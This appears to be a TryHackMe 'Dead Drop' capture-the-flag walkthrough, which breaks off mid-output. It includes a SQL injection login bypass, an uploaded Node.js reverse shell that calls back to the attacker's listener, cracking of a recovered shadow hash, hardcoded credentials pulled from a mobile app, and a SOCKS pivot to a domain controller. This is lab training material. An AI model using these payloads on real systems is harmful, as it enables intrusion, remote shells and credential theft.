# [TryHackMe | Dead Drop](https://tryhackme.com/room/dead-drop) Challenge Room Solution Writeup

## [Task 2 | Dead Drop](https://tryhackme.com/room/dead-drop?taskNo=2)

### What password grants you SSH access to the web server?

Begin by scanning `TARGET_IP_WEB` with `nmap`.

```bash
root@ip-ATTACKER_IP:~# nmap -sV -sC -p- TARGET_IP_WEB
Starting Nmap 7.94SVN ( https://nmap.org ) at 
Nmap scan report for ip-TARGET_IP_WEB.ec2.internal (TARGET_IP_WEB)
Host is up (0.11s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3a:25:e1:ae:0f:b8:3d:b8:0a:a7:0c:e8:33:b9:3b:62 (ECDSA)
|_  256 75:7b:b0:62:0c:b6:3a:66:6d:93:7d:f1:ed:05:27:b7 (ED25519)
80/tcp open  http    Node.js Express framework
| http-title: DeadDrop - Login
|_Requested resource was /login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1729.64 seconds
```

Use `gobuster` to map out the directory structure of the `TARGET_IP` website. 

```yaml
root@ip-ATTACKER_IP:~# gobuster dir --url http://TARGET_IP_WEB/ -w /usr/share/wordlists/dirb/big.txt -r -x html,php,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://TARGET_IP_WEB/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,html,php
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/Login                (Status: 200) [Size: 2068]
/dashboard            (Status: 200) [Size: 2068]
/login                (Status: 200) [Size: 2068]
/logout               (Status: 200) [Size: 2068]
Progress: 81876 / 81880 (100.00%)
===============================================================
Finished
===============================================================
```

Inspect `/login` to discover a login page.

```html
root@ip-ATTACKER_IP:~# curl -sX GET http://TARGET_IP_WEB/login | sed '/<style\b/,/<\/style>/d'
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>DeadDrop - Login</title>
</head>
<body>
  <div class="login-box">
    <h1>DeadDrop</h1>
    <p class="subtitle">Secure File Sharing Platform</p>
    
    <form method="POST" action="/login">
      <div class="form-group">
        <label for="username">Username</label>
        <input type="text" id="username" name="username" required autofocus>
      </div>
      <div class="form-group">
        <label for="password">Password</label>
        <input type="password" id="password" name="password" required>
      </div>
      <button type="submit" class="btn">Sign In</button>
    </form>
  </div>
</body>
</html>
```

There is no immediately apparent vulnerability to exploit. Perhaps the login page is vulnerable to Search Query Language inejction (SQLi).

```html
root@ip-ATTACKER_IP:~# curl -c cookies.txt -iX POST http://TARGET_IP_WEB/login --data-urlencode "username=' OR 1=1;-- -" --data-urlencode 'password=password'
HTTP/1.1 302 Found
X-Powered-By: Express
Location: /dashboard
Vary: Accept
Content-Type: text/plain; charset=utf-8
Content-Length: 32
Set-Cookie: connect.sid=s%3ABgW0y4zzhdIC8NA4dEXP5G0aoPd0K_x6.wpLgAus0oZEDfvGXyhTrLnsUPSRWcywW6mOLavVqobc; Path=/; Expires=; HttpOnly
Date: 
Connection: keep-alive
Keep-Alive: timeout=5

Found. Redirecting to /dashboard
```

Inspect `/dashboard` using the saved session cookie to identify potentially sensitive information. The SQLi login bypass authenticated the session as `username=admin`. The earlier `nmap` scan identified the web application as running on `Node.js` with the `Express` framework, indicating that the backend is `JavaScript`-based and that `Node.js`-specific vulnerabilities may be relevant. The dashboard provides an authenticated file-management interface, supporting file uploads, previews, renaming, and deletion. It also exposes a list of existing submissions, including several `JavaScript` files and a file named `passwd`; these may contain useful information about the application's functionality, previous testing attempts, or potential attack vectors. 

```html
root@ip-ATTACKER_IP:~# curl -b cookies.txt -s http://TARGET_IP_WEB/dashboard | sed '/<style\b/,/<\/style>/d'
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>DeadDrop - Dashboard</title>
</head>
<body>
  <div class="navbar">
    <h1>DeadDrop</h1>
    <div class="user-info">
      Logged in as <strong>admin</strong>
      <a href="/logout">Sign Out</a>
    </div>
  </div>
  <div class="container">
    <div class="upload-box">
      <h2>Upload File</h2>
      <form method="POST" action="/upload" enctype="multipart/form-data" class="upload-form">
        <input type="file" name="file" required>
        <button type="submit" class="btn">Upload</button>
      </form>
    </div>

    
      <table class="files-table">
        <thead>
          <tr>
            <th>Filename</th>
            <th>Size</th>
            <th>Actions</th>
          </tr>
        </thead>
        <tbody>
          
            <tr>
              <td>escape_shell.js</td>
              <td>0.2 KB</td>
              <td>
                <div class="actions">
                  <a href="/preview/escape_shell.js" class="btn btn-sm btn-outline">Preview</a>
                  <form method="POST" action="/rename" class="rename-form">
                    <input type="hidden" name="oldName" value="escape_shell.js">
                    <input type="text" name="newName" placeholder="New name">
                    <button type="submit" class="btn btn-sm btn-outline">Rename</button>
                  </form>
                  <form method="POST" action="/delete" style="display:inline;">
                    <input type="hidden" name="filename" value="escape_shell.js">
                    <button type="submit" class="btn btn-sm btn-danger">Delete</button>
                  </form>
                </div>
              </td>
            </tr>
          
            <tr>
              <td>passwd</td>
              <td>0.3 KB</td>
              <td>
                <div class="actions">
                  <a href="/preview/passwd" class="btn btn-sm btn-outline">Preview</a>
                  <form method="POST" action="/rename" class="rename-form">
                    <input type="hidden" name="oldName" value="passwd">
                    <input type="text" name="newName" placeholder="New name">
                    <button type="submit" class="btn btn-sm btn-outline">Rename</button>
                  </form>
                  <form method="POST" action="/delete" style="display:inline;">
                    <input type="hidden" name="filename" value="passwd">
                    <button type="submit" class="btn btn-sm btn-danger">Delete</button>
                  </form>
                </div>
              </td>
            </tr>
          
            <tr>
              <td>pwn.js</td>
              <td>0.3 KB</td>
              <td>
                <div class="actions">
                  <a href="/preview/pwn.js" class="btn btn-sm btn-outline">Preview</a>
                  <form method="POST" action="/rename" class="rename-form">
                    <input type="hidden" name="oldName" value="pwn.js">
                    <input type="text" name="newName" placeholder="New name">
                    <button type="submit" class="btn btn-sm btn-outline">Rename</button>
                  </form>
                  <form method="POST" action="/delete" style="display:inline;">
                    <input type="hidden" name="filename" value="pwn.js">
                    <button type="submit" class="btn btn-sm btn-danger">Delete</button>
                  </form>
                </div>
              </td>
            </tr>
          
            <tr>
              <td>reverse.js</td>
              <td>0.1 KB</td>
              <td>
                <div class="actions">
                  <a href="/preview/reverse.js" class="btn btn-sm btn-outline">Preview</a>
                  <form method="POST" action="/rename" class="rename-form">
                    <input type="hidden" name="oldName" value="reverse.js">
                    <input type="text" name="newName" placeholder="New name">
                    <button type="submit" class="btn btn-sm btn-outline">Rename</button>
                  </form>
                  <form method="POST" action="/delete" style="display:inline;">
                    <input type="hidden" name="filename" value="reverse.js">
                    <button type="submit" class="btn btn-sm btn-danger">Delete</button>
                  </form>
                </div>
              </td>
            </tr>
          
            <tr>
              <td>sh.js</td>
              <td>0.2 KB</td>
              <td>
                <div class="actions">
                  <a href="/preview/sh.js" class="btn btn-sm btn-outline">Preview</a>
                  <form method="POST" action="/rename" class="rename-form">
                    <input type="hidden" name="oldName" value="sh.js">
                    <input type="text" name="newName" placeholder="New name">
                    <button type="submit" class="btn btn-sm btn-outline">Rename</button>
                  </form>
                  <form method="POST" action="/delete" style="display:inline;">
                    <input type="hidden" name="filename" value="sh.js">
                    <button type="submit" class="btn btn-sm btn-danger">Delete</button>
                  </form>
                </div>
              </td>
            </tr>
          
            <tr>
              <td>she.js</td>
              <td>0.1 KB</td>
              <td>
                <div class="actions">
                  <a href="/preview/she.js" class="btn btn-sm btn-outline">Preview</a>
                  <form method="POST" action="/rename" class="rename-form">
                    <input type="hidden" name="oldName" value="she.js">
                    <input type="text" name="newName" placeholder="New name">
                    <button type="submit" class="btn btn-sm btn-outline">Rename</button>
                  </form>
                  <form method="POST" action="/delete" style="display:inline;">
                    <input type="hidden" name="filename" value="she.js">
                    <button type="submit" class="btn btn-sm btn-danger">Delete</button>
                  </form>
                </div>
              </td>
            </tr>
          
            <tr>
              <td>shel.js</td>
              <td>0.2 KB</td>
              <td>
                <div class="actions">
                  <a href="/preview/shel.js" class="btn btn-sm btn-outline">Preview</a>
                  <form method="POST" action="/rename" class="rename-form">
                    <input type="hidden" name="oldName" value="shel.js">
                    <input type="text" name="newName" placeholder="New name">
                    <button type="submit" class="btn btn-sm btn-outline">Rename</button>
                  </form>
                  <form method="POST" action="/delete" style="display:inline;">
                    <input type="hidden" name="filename" value="shel.js">
                    <button type="submit" class="btn btn-sm btn-danger">Delete</button>
                  </form>
                </div>
              </td>
            </tr>
          
        </tbody>
      </table>
    
  </div>
</body>
</html>
```

Inspect `/preview/passwd` to uncover a `Node.js` reverse-shell payload, suggesting a previous attempt to establish remote access to the application server. All other files—which contain `.js` extensions—return empty JSON objects (`{}`) when previewed. Combined with the reverse-shell payload, this raises the possibility that uploaded `JavaScript` files are being processed or executed server-side when previewed, rather than simply stored and served as static files. This warrants further investigation into the application's upload and file-processing mechanisms.

```js
root@ip-ATTACKER_IP:~# curl -b cookies.txt -X GET http://TARGET_IP_WEB/preview/passwd
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(4444, "10.64.126.81", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
```

Replicate this payload using the AttackBox `TUN0_IP` and upload it.

```bash
root@ip-ATTACKER_IP:~# ip addr show tun0
6: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
    link/none 
    inet 192.168.21.5/24 brd 192.168.21.255 scope global tun0
       valid_lft forever preferred_lft forever
    inet6 fe80::5e23:c949:fa22:f5e2/64 scope link stable-privacy 
       valid_lft forever preferred_lft forever
root@ip-ATTACKER_IP:~# cat > shell.js << 'EOF'
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(4444, "192.168.21.5", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
EOF
root@ip-ATTACKER_IP:~# curl -b cookies.txt -X POST -F "file=@shell.js" http://TARGET_IP_WEB/upload
```

Start a listener in a separate terminal.

```bash
root@ip-ATTACKER_IP:~# nc -lvnp 4444
Listening on 0.0.0.0 4444
```

Preview the file to trigger the connection.

```html
root@ip-ATTACKER_IP:~# curl -b cookies.txt -s http://TARGET_IP_WEB/preview/shell.js | sed '/<style\b/,/<\/style>/d'
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>DeadDrop - Preview: shell.js</title>
</head>
<body>
  <div class="navbar">
    <h1>DeadDrop</h1>
    <a href="/dashboard">&larr; Back to Dashboard</a>
  </div>
  <div class="container">
    <div class="preview-box">
      <h2>Preview: shell.js</h2>
      <div class="content">{}</div>
    </div>
  </div>
</body>
</html>
```

Discover and read `/backup/shadow.bak` to obtain `username=svc-drop` and their hash.

```bash
Connection received on TARGET_IP_WEB 43754
node:~$ whoami
node:~$ node
node:~$ id
uid=996(node) gid=996(node) groups=996(node)
node:~$ ls -l
total 92
-rw-r--r--   1 node node  7174 May  9  2026 app.js
drwxr-xr-x   2 node node  4096 May  9  2026 backup
drwxr-xr-x   2 node node  4096 May  9  2026 db
drwxr-xr-x 131 node node  4096 May  9  2026 node_modules
-rw-r--r--   1 node node 56703 May  9  2026 package-lock.json
-rw-r--r--   1 node node   335 May  9  2026 package.json
drwxr-xr-x   2 node node  4096 May  9  2026 public
drwxr-xr-x   2 node node  4096 Nov 12 12:36 uploads
drwxr-xr-x   2 node node  4096 May  9  2026 views
node:~$ ls -l backup
total 4
-rw-r--r-- 1 node node 135 May  9  2026 shadow.bak
node:~$ cat backup/shadow.bak
svc-drop:$6$f1331af25300c7f3$7twueSf8eUyvgYnPWElPYpspGgBuYJ.TMGrPZ2OBC6pGq18ZGkkPke9S0tRlQ3EpiRLWEqhgnqkh2BOHfdCCH0:19700:0:99999:7:::
```

Crack their hash.

```bash
root@ip-ATTACKER_IP:~# echo 'svc-drop:$6$f1331af25300c7f3$7twueSf8eUyvgYnPWElPYpspGgBuYJ.TMGrPZ2OBC6pGq18ZGkkPke9S0tRlQ3EpiRLWEqhgnqkh2BOHfdCCH0:19700:0:99999:7:::' > shadow.hash
root@ip-ATTACKER_IP:~# john shadow.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Note: Passwords longer than 26 [worst case UTF-8] to 79 [ASCII] rejected
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
dropsofjupiter   (svc-drop)     
1g 0:00:10:03 DONE () 0.001657g/s 514.9p/s 514.9c/s 514.9C/s dweezil..dottie22
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

The `SSH` password is **dropsofjupiter**.

### What credentials does the company's internal mobile application contain? (Format: username:password)

Connect to the `SSH` service running on port `22` using `username=svc-drop&password=dropsofjupiter`.

```bash
root@ip-ATTACKER_IP:~# ssh svc-drop@TARGET_IP_WEB
The authenticity of host 'TARGET_IP_WEB (TARGET_IP_WEB)' can't be established.
ED25519 key fingerprint is SHA256:kdBKuActuRz5g11/rUE2ORwoXwBjbb0BRUwIBh0E+fc.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'TARGET_IP_WEB' (ED25519) to the list of known hosts.
svc-drop@TARGET_IP_WEB's password: 
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-1017-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of 

  System load:  0.0                Temperature:           -273.1 C
  Usage of /:   14.5% of 19.31GB   Processes:             101
  Memory usage: 6%                 Users logged in:       0
  Swap usage:   0%                 IPv4 address for ens5: TARGET_IP_WEB


Expanded Security Maintenance for Applications is not enabled.

254 updates can be applied immediately.
153 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: 
svc-drop@tryhackme-2404:~$ whoami
svc-drop
svc-drop@tryhackme-2404:~$ id
uid=1001(svc-drop) gid=1001(svc-drop) groups=1001(svc-drop)
svc-drop@tryhackme-2404:~$ ls -l
total 4
drwxr-xr-x 2 svc-drop svc-drop 4096 May  9  2026 backup
svc-drop@tryhackme-2404:~$ ls -l backup/
total 6244
-rw-r--r-- 1 svc-drop svc-drop 6392031 May  9  2026 deaddrop-mobile.apk
```

Download, decompile, and search the application for credentials to discover `username=`**j.harris**`&password=`**DropsOfJupiter2026!**.

```bash
root@ip-ATTACKER_IP:~# scp svc-drop@TARGET_IP_WEB:/home/svc-drop/backup/deaddrop-mobile.apk /root/
svc-drop@TARGET_IP_WEB's password: 
deaddrop-mobile.apk                           100% 6242KB   1.8MB/s   00:03    
root@ip-ATTACKER_IP:~# jadx -d deaddrop-mobile/ deaddrop-mobile.apk 
INFO  - loading ...
INFO  - processing ...
ERROR - finished with errors, count: 16                      
root@ip-ATTACKER_IP:~# grep -RniE 'username = |password = ' deaddrop-mobile/ 2>/dev/null
deaddrop-mobile/sources/com/deaddrop/mobile/Config.java:6:    public static final String DEFAULT_PASSWORD = "DropsOfJupiter2026!";
deaddrop-mobile/sources/com/deaddrop/mobile/Config.java:7:    public static final String DEFAULT_USERNAME = "j.harris";
deaddrop-mobile/sources/com/deaddrop/mobile/R.java:3216:        public static final int avd_hide_password = 0x7f070078;
deaddrop-mobile/sources/com/deaddrop/mobile/R.java:3219:        public static final int avd_show_password = 0x7f070079;
deaddrop-mobile/sources/com/deaddrop/mobile/R.java:3324:        public static final int m3_avd_hide_password = 0x7f07009e;
deaddrop-mobile/sources/com/deaddrop/mobile/R.java:3327:        public static final int m3_avd_show_password = 0x7f07009f;
deaddrop-mobile/sources/com/deaddrop/mobile/R.java:5439:        public static int default_password = 0x7f0f002f;
deaddrop-mobile/sources/com/deaddrop/mobile/R.java:5440:        public static int default_username = 0x7f0f0030;
deaddrop-mobile/sources/com/google/android/material/R.java:2659:        public static int avd_hide_password = 0x7f070078;
deaddrop-mobile/sources/com/google/android/material/R.java:2660:        public static int avd_show_password = 0x7f070079;
deaddrop-mobile/sources/com/google/android/material/R.java:2681:        public static int m3_avd_hide_password = 0x7f07009e;
deaddrop-mobile/sources/com/google/android/material/R.java:2682:        public static int m3_avd_show_password = 0x7f07009f;
root@ip-ATTACKER_IP:~# 
```

### What Active Directory permission does your domain account hold that can be abused for privilege escalation?

Although the Domain Controller (DC) is not directly accessible from the AttackBox, it is reachable from the internal network. With `SSH` access to `svc-drop` at `TARGET_IP_WEB`, we can use the compromised host as a pivot point to reach the DC through a `SOCKS` proxy. In one terminal, establish the dynamic `SOCKS` proxy over `SSH`.

```bash
root@ip-ATTACKER_IP:~# ssh -N -D 9050 svc-drop@TARGET_IP_WEB
svc-drop@TARGET_IP_WEB's password: 
```

In a separate terminal, scan the DC with `nmap`, skipping host discovery.

```bash
root@ip-ATTACKER_IP:~# proxychains nmap -Pn -sT -F TARGET_IP_DC
ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.94SVN ( https://nmap.org ) at 
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:23-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:22-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:3306-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:5900-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:3389-<><>-OK
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:8888-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:995-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:445-<><>-OK
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:25-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:80-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:135-<><>-OK
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:53-<><>-OK
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:139-<><>-OK
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:443-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:113-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:143-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:8080-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:21-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:110-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:111-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:587-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:554-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:993-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:199-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:1723-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:1720-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:1025-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:81-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:49154-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:9999-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:9100-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:37-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:32768-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:1110-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:513-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:6001-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:5666-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:1755-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:88-<><>-OK
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:10000-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:544-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:9-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:79-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:8443-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:444-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:465-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:5357-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:179-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:1433-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:49153-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:548-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:49152-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:49157-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:389-<><>-OK
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:26-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:8000-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:3128-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:6000-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:49155-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:4899-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:1029-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:2049-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:5800-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:1900-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:8009-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:8008-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:646-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:6646-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:5051-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:1028-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:5631-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:1027-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:2717-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:2001-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:7-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:5009-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:106-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:543-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:873-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:7070-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:3000-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:5000-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:5060-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:5432-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:5101-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:2000-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:2121-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:514-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:427-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:990-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:5190-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:13-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:144-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:119-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:3986-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:49156-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:8081-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:1026-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:515-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:631-<--timeout
Nmap scan report for ip-TARGET_IP_DC.ec2.internal (TARGET_IP_DC)
Host is up (6.0s latency).
Not shown: 93 closed tcp ports (conn-refused)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 1397.36 seconds
```

Assess the access of `username=j.harris&password=DropsOfJupiter2026!` on Lightweight Directory Access Protocol (`LDAP`), Server Message Block (`SMB`), and Remote Fesktop Protocol (`RDP`). This user has valid authentication credentials and administrative access—as indicated by `NetExec`'s `(Pwn3d!)` flag—for all three services. Also discovered are `domain=deaddrop.loc` and `hostname=DEADDROP-DC`.

```bash
root@ip-ATTACKER_IP:~# for service in ldap rdp smb; do proxychains nxc $service TARGET_IP_DC -u 'j.harris' -p 'DropsOfJupiter2026!'; done
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:389-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:389-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:636-<><>-OK
|DNS-request| deaddrop.loc 
|S-chain|-<>-127.0.0.1:9050-<><>-4.2.2.2:53-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-4.2.2.2:53-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-4.2.2.2:53-<--timeout
|DNS-response|: deaddrop.loc does not exist
LDAP        TARGET_IP_DC  389    DEADDROP-DC      [*] Windows 10 / Server 2019 Build 17763 (name:DEADDROP-DC) (domain:deaddrop.loc) (signing:None) (channel binding:No TLS cert) 
|S-chain|-<>-127.0.0.1:9050-<><>-TARGET_IP_DC:389-<><>-OK
